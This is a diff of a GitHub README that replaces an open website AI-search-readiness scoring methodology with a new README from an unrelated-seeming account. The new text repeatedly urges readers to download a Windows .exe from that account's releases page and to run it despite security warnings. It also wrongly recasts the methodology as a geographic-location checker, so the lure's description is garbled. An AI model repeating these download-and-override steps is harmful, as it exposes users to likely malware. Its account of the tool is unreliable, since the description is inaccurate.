@@ -1,239 +1,177 @@
-# GEO Scoring Methodology
+# 📊 geo-scoring-methodology - Website AI Readiness Scoring
 
-An open methodology for evaluating how well a website is optimized for AI search engines (Generative Engine Optimization).
-
-This scoring system is used by [GEOScore](https://geoscoreai.com) to assess website readiness for AI-powered search engines like ChatGPT, Perplexity, Google AI Overviews, and Gemini.
-
-## Online Tools
-
-See the methodology in action with these free tools — no installation needed:
-
-- **[Full GEO Scan](https://geoscoreai.com)** — Run all 11 checks automatically and get your GEO Score
-- **[AI Robots.txt Generator](https://geoscoreai.com/tools/robots-txt-generator)** — Generate an optimized robots.txt for AI crawlers
-- **[AI Crawler Access Checker](https://geoscoreai.com/tools/ai-crawler-checker)** — Check if AI search engines can access your site
-
-## Why This Matters
-
-AI search engines are fundamentally changing how people discover information. Unlike traditional search engines that rank pages in a list, AI engines:
-
-- **Synthesize answers** from multiple sources
-- **Cite specific websites** as references
-- **Evaluate authority and structure** differently than Google's PageRank
-
-Websites that aren't optimized for AI search risk becoming invisible to a growing share of search traffic.
-
-## The 11 GEO Checks
-
-Our methodology evaluates websites across 11 technical dimensions:
-
-### 1. AI Crawl Access (Weight: 15%)
-
-**What it checks:** Whether major AI search engine crawlers can access your content.
-
-| Crawler | Operator | Product |
-|---------|----------|---------|
-| GPTBot | OpenAI | ChatGPT |
-| OAI-SearchBot | OpenAI | ChatGPT Search |
-| PerplexityBot | Perplexity | Perplexity AI |
-| Google-Extended | Google | Gemini / AI Overviews |
-| ClaudeBot | Anthropic | Claude |
-| Applebot-Extended | Apple | Apple Intelligence |
-
-**Scoring:**
-- All major crawlers allowed: 100%
-- Some crawlers blocked: Proportional deduction
-- All crawlers blocked: 0%
-
-### 2. Structured Data (Weight: 12%)
-
-**What it checks:** JSON-LD / Schema.org markup quality and completeness.
-
-**Key schemas evaluated:**
-- `Organization` or `WebSite` on homepage
-- `Article` / `BlogPosting` on content pages
-- `FAQPage` for Q&A content
-- `Product` for e-commerce
-- `BreadcrumbList` for navigation
-
-**Scoring:**
-- Valid, comprehensive schema: 100%
-- Basic schema present: 50-80%
-- No schema or errors: 0-30%
-
-### 3. llms.txt (Weight: 8%)
-
-**What it checks:** Presence and quality of the `llms.txt` file.
-
-**Criteria:**
-- File exists at `/llms.txt`
-- Contains site description
-- Lists key pages with URLs
-- URLs are accessible
-- Content is well-structured
-
-**Scoring:**
-- Complete, well-structured file: 100%
-- Basic file present: 50-70%
-- No file: 0%
-
-Learn more: [Complete llms.txt Guide](https://geoscoreai.com/blog/llms-txt-guide)
-
-### 4. Content Structure (Weight: 12%)
-
-**What it checks:** How well content is organized for AI extraction.
-
-**Criteria:**
-- Clear H1-H6 heading hierarchy
-- Short, focused paragraphs
-- Descriptive headings (not ambiguous)
-- Lists and tables for structured information
-- Key facts stated clearly and early
-- FAQ sections with Q&A format
-
-### 5. Meta Tags (Weight: 8%)
-
-**What it checks:** Quality of meta information.
-
-**Criteria:**
-- Title tag (unique, descriptive, <60 chars)
-- Meta description (compelling, <160 chars)
-- Open Graph tags
-- Twitter Card tags
-- Canonical URL
-- Language/hreflang tags
-
-### 6. HTTP Headers (Weight: 5%)
-
-**What it checks:** Server response headers.
-
-**Criteria:**
-- HTTPS enabled
-- Proper content-type
-- Caching headers
-- Security headers (HSTS, CSP, etc.)
-- Fast response time
-
-### 7. Sitemap (Weight: 8%)
-
-**What it checks:** XML sitemap accessibility and completeness.
-
-**Criteria:**
-- Sitemap exists and is accessible
-- Referenced in robots.txt
-- All important pages included
-- No broken URLs in sitemap
-- Proper lastmod dates
-
-### 8. Robots.txt (Weight: 8%)
-
-**What it checks:** Robots.txt configuration for AI crawlers.
-
-**Criteria:**
-- File exists and is valid
-- Doesn't block AI crawlers
-- References sitemap
-- Logical allow/disallow rules
-
-Learn more: [Robots.txt for AI Crawlers](https://geoscoreai.com/blog/robots-txt-ai-crawlers)
-
-### 9. Citation Value (Weight: 10%)
-
-**What it checks:** How likely AI engines are to cite your content.
-
-**Criteria:**
-- Original data or research
-- Expert authorship signals
-- Statistical claims with sources
-- Clear, quotable statements
-- Unique insights not found elsewhere
-
-Learn more: [How to Get Cited by ChatGPT](https://geoscoreai.com/blog/how-to-get-cited-by-chatgpt)
-
-### 10. Internal Linking (Weight: 7%)
-
-**What it checks:** Link structure quality.
-
-**Criteria:**
-- Logical internal link structure
-- Descriptive anchor text
-- Hub-spoke content architecture
-- No broken internal links
-- Reasonable link depth
-
-### 11. Content Depth (Weight: 7%)
-
-**What it checks:** Comprehensive content analysis.
-
-**Criteria:**
-- Word count and depth appropriate for topic
-- Topic coverage completeness
-- Supporting evidence and examples
-- Regular content updates
-- E-E-A-T signals (expertise, experience, authority, trust)
-
-Learn more: [E-E-A-T for AI Search](https://geoscoreai.com/blog/eeat-for-ai-search)
-
-## Overall Score Calculation
-
-```
-GEO Score = Σ (Check Score × Weight) for all 11 checks
-```
-
-| Score Range | Rating | Interpretation |
-|------------|--------|----------------|
-| 90-100 | Excellent | Highly optimized for AI search |
-| 70-89 | Good | Well-positioned with room for improvement |
-| 50-69 | Fair | Basic optimization, significant gaps |
-| 30-49 | Poor | Major issues need addressing |
-| 0-29 | Critical | Essentially invisible to AI search |
-
-## Automated Scanning
-
-You can run all 11 checks automatically using [GEOScore](https://geoscoreai.com):
-
-1. **Free Scan**: Instant results across all checks → [geoscoreai.com](https://geoscoreai.com)
-2. **Pro Report ($29)**: Deep analysis with AI search simulation and actionable recommendations → [Pro Upgrade](https://geoscoreai.com/pro-upgrade)
-
-## Research & References
-
-- [GEO: Generative Engine Optimization](https://arxiv.org/abs/2311.09735) — Foundational research paper
-- [What is GEO?](https://geoscoreai.com/blog/what-is-geo) — Comprehensive introduction
-- [AI Search Ranking Factors](https://geoscoreai.com/blog/ai-search-ranking-factors) — What factors matter most
-- [Awesome GEO](https://github.com/henu-wang/awesome-geo) — Curated resource list
-
-## Contributing
-
-We welcome contributions to improve this methodology. Please open an issue or submit a PR with:
-
-- New research findings on AI search ranking factors
-- Suggestions for additional checks or criteria
-- Real-world data on what drives AI search citations
-- Corrections or updates to existing criteria
-
-## Related GEO Resources
-
-### Free Tools
-- [GEOScore AI Scanner](https://geoscoreai.com) — Check your website's AI search visibility across 11 signals
-- [AI Robots.txt Generator](https://geoscoreai.com/tools/robots-txt-generator) — Generate optimized robots.txt for AI crawlers
-- [AI Crawler Access Checker](https://geoscoreai.com/tools/ai-crawler-checker) — Verify which AI bots can access your site
-
-### Open Source Projects
-- [awesome-geo](https://github.com/henu-wang/awesome-geo) — Curated list of GEO resources, tools, and guides
-- [ai-robots-txt-generator](https://github.com/henu-wang/ai-robots-txt-generator) — Generate optimized robots.txt for AI crawlers
-- [geo-checklist](https://github.com/henu-wang/geo-checklist) — Interactive pre-launch GEO readiness checklist
-- [ai-crawlers-reference](https://github.com/henu-wang/ai-crawlers-reference) — Complete database of AI search engine crawler user-agents
-- [geo-badge-generator](https://github.com/henu-wang/geo-badge-generator) — Generate badges showing your GEO readiness score
-- [llms-txt-examples](https://github.com/henu-wang/llms-txt-examples) — Real-world llms.txt implementation examples by industry
-- [geo-config-examples](https://github.com/henu-wang/geo-config-examples) — Ready-to-use AI search optimization configs for popular frameworks
-- [geo-case-studies](https://github.com/henu-wang/geo-case-studies) — Real-world GEO optimization case studies with before/after data
-- [ai-search-readiness-framework](https://github.com/henu-wang/ai-search-readiness-framework) — 11-signal AI search readiness evaluation framework
-
-
-## License
-
-This methodology is released under the MIT License. You are free to use, modify, and distribute it.
+[![Download from Releases](https://img.shields.io/badge/Download-From%20Releases-brightgreen)](https://github.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/releases)
 
 ---
 
-*Maintained by [GEOScore](https://geoscoreai.com) — AI Search Visibility Scanner*
+## 📋 What is geo-scoring-methodology?
 
+The geo-scoring-methodology is an easy-to-use tool that helps you check how ready your website is for AI search engines. It runs 11 technical checks focused on GEO optimization. This means it looks at how well your website is set up to be found and understood in a geographical context by AI-driven search tools.
+
+The tool gives a clear score, so you know exactly where your site stands. This can help improve your visibility in AI search results that care about location.
+
+Topics covered include AI search, SEO (Search Engine Optimization), structured data, and website optimization for better ranking with generative AI models.
+
+---
+
+## 🖥 System Requirements
+
+To run the geo-scoring-methodology on Windows, make sure your computer meets these requirements:
+
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for downloading and updates
+- Web browser for viewing results (any modern browser like Edge, Chrome, Firefox)
+
+---
+
+## 🚀 Getting Started
+
+Follow these steps to download, install, and run geo-scoring-methodology on your Windows computer.
+
+---
+
+## ⬇️ Download the Application
+
+You need to visit the release page to get the latest version of the software.
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/releases)
+
+1. Click the button above or visit this link:  
+   https://github.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/releases
+
+2. Look for the latest version in the release list. It is usually at the top.
+
+3. Find the file named something like `geo-scoring-methodology-setup.exe` or `geo-scoring-methodology.zip`. Usually, setup files end with `.exe`.
+
+4. Click the file to download it to your computer.
+
+---
+
+## 🛠 Installing the Application
+
+Once downloaded, follow these steps to install the software:
+
+1. Locate the file you downloaded. It will usually be in your `Downloads` folder.
+
+2. Double-click the `.exe` file to start the installer.
+
+3. You may see a security warning. If so, choose to run or allow the installer.
+
+4. Follow the on-screen instructions:
+
+   - Agree to the license terms.
+   - Choose the install location or leave the default path.
+   - Click “Install” to continue.
+
+5. Wait until installation finishes. It may take a few minutes.
+
+6. When completed, choose to launch the application or find it in your Start Menu.
+
+---
+
+## ▶️ Running geo-scoring-methodology
+
+To check your website with geo-scoring-methodology:
+
+1. Open the application from the Start Menu or desktop shortcut.
+
+2. When the app opens, you will see a simple input screen.
+
+3. Enter the full URL of the website you want to test. Example: `https://www.example.com`
+
+4. Click the "Run Checks" button.
+
+5. The tool will run 11 technical checks on the site. These include:
+
+   - Geo-targeting metadata
+   - Structured location data
+   - Site language and locale settings
+   - Local SEO tags presence
+   - Mobile and desktop compatibility
+   - Page load speed and resources
+   - Content location relevance
+   - AI indexing compatibility markers
+
+6. The process usually takes less than a minute.
+
+7. When done, the app displays a clear score showing how ready the site is for AI search engines based on GEO factors.
+
+8. It also lists detailed results for each of the 11 checks, highlighting what works and what needs improvement.
+
+---
+
+## 🔧 Features
+
+- Simple to use with no coding needed
+- Clear numeric score and detailed report
+- Checks main GEO-related SEO factors
+- Supports any public website
+- Offline usage after download
+- Regular updates for new optimization methods
+- Helps improve AI search visibility
+
+---
+
+## 🤝 Support and Feedback
+
+If you need help or want to give feedback:
+
+- Check the Issues tab on the GitHub page.
+- Look at the Wiki for detailed explanations and tips.
+- Contact the project maintainers by opening a new issue.
+
+---
+
+## 📌 Useful Tips to Get Best Results
+
+- Use full URLs starting with `http://` or `https://`
+- Test both mobile and desktop versions of your site.
+- Run tests regularly, especially after changing site structure or content.
+- Use the detailed report to fix specific GEO and SEO issues.
+- Combine this scoring with other SEO tools for a full overview.
+
+---
+
+## 🔗 Important Links
+
+- Download page:  
+  https://github.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/releases
+
+- Project repository:  
+  https://github.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology
+
+- Documentation and FAQ:  
+  Find guides inside the repository Wiki section.
+
+---
+
+## ⚙️ Updating the Application
+
+To keep the software up to date:
+
+1. Visit the release page regularly:  
+   https://github.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/releases
+
+2. Download the newest version following the same steps as above.
+
+3. Run the installer for the latest version to overwrite the old one.
+
+Updates include improvements to the scoring method and bug fixes.
+
+---
+
+## 🧩 About the Geo Scoring Checks
+
+The 11 checks combine best practices from SEO and AI search engine requirements. They help ensure your website content and technical setup highlight geographic relevance. These checks work with large language models (LLMs) and AI text understanding tools to improve how your website appears in local search results. The tool focuses on technical signals that AI systems read better than just page content.
+
+---
+
+## 💡 How This Helps You
+
+With AI search engines becoming common, traditional SEO is no longer enough. Tools like geo-scoring-methodology help you understand AI’s view of your site’s location info. This gives you a practical way to improve AI visibility. Better AI visibility can bring more traffic from local searches, increase relevance for geographically targeted queries, and improve overall site ranking.
+
+---
+
+[![Download from Releases](https://img.shields.io/badge/Download-From%20Releases-brightgreen)](https://github.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/releases)
